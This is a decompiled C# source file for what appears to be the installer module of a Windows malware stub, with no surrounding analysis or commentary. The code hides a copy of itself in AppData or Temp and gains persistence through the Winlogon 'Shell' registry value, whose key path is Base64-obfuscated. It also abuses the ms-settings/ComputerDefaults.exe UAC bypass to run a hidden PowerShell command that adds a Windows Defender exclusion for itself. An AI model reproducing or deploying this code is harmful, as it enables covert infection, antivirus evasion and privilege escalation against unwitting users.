using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000013 RID: 19
	public static class Installer
	{
		// Token: 0x0600003E RID: 62 RVA: 0x00003344 File Offset: 0x00001544
		public static void Run(string path, string folder, string filename, string wdex)
		{
			Installer.FileName = new FileInfo(filename);
			if (path == "0")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folder));
			}
			if (path == "1")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), folder));
			}
			if (path == "2")
			{
				Installer.DirectoryName = new DirectoryInfo(Path.Combine(Path.GetTempPath(), folder));
			}
			if (!Installer.IsInstalled())
			{
				try
				{
					Installer.CreateDirectory();
					Installer.InstallFile();
					Installer.InstallRegistry();
					if (wdex == "True")
					{
						try
						{
							Installer.ExclusionWD();
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000020D8 File Offset: 0x000002D8
		public static bool IsInstalled()
		{
			return Application.ExecutablePath == Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name);
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00002102 File Offset: 0x00000302
		public static void CreateDirectory()
		{
			if (!Installer.DirectoryName.Exists)
			{
				Installer.DirectoryName.Create();
			}
			Installer.DirectoryName.Attributes = FileAttributes.Hidden;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003414 File Offset: 0x00001614
		public static void InstallFile()
		{
			string text = Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name);
			if (Installer.FileName.Exists)
			{
				foreach (Process process in Process.GetProcesses())
				{
					try
					{
						if (process.MainModule.FileName == text)
						{
							process.Kill();
						}
					}
					catch
					{
					}
				}
				File.Delete(text);
				Thread.Sleep(250);
			}
			using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write))
			{
				byte[] array = File.ReadAllBytes(Application.ExecutablePath);
				fileStream.Write(array, 0, array.Length);
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000034DC File Offset: 0x000016DC
		public static void InstallRegistry()
		{
			if (Installer.GetRegKey() == null)
			{
				byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
				string @string = Encoding.UTF8.GetString(bytes);
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(@string);
				registryKey.SetValue("Shell", "explorer.exe, " + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name));
				registryKey.Close();
				return;
			}
			if (!Installer.GetRegKey().Contains(Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name)))
			{
				string text = Installer.GetRegKey().Substring(Installer.GetRegKey().Length - 1, 1);
				if (text == ",")
				{
					text = Installer.GetRegKey() + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + ",";
				}
				else
				{
					text = Installer.GetRegKey() + "," + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + ",";
				}
				byte[] bytes2 = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
				string string2 = Encoding.UTF8.GetString(bytes2);
				Registry.CurrentUser.OpenSubKey(string2, true).SetValue("Shell", text);
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000361C File Offset: 0x0000181C
		public static void ExclusionWD()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
				registryKey.SetValue("", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath '" + Path.Combine(Installer.DirectoryName.FullName, Installer.FileName.Name) + "'");
				registryKey.Close();
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
				registryKey2.SetValue("DelegateExecute", "");
				registryKey2.Close();
				Process.Start("C:\\Windows\\System32\\ComputerDefaults.exe");
				Thread.Sleep(1000);
			}
			catch
			{
			}
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000036C0 File Offset: 0x000018C0
		public static string GetRegKey()
		{
			string result;
			try
			{
				byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
				string @string = Encoding.UTF8.GetString(bytes);
				result = Registry.CurrentUser.OpenSubKey(@string).GetValue("Shell").ToString();
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x04000041 RID: 65
		public static FileInfo FileName;

		// Token: 0x04000042 RID: 66
		public static DirectoryInfo DirectoryName;
	}
}
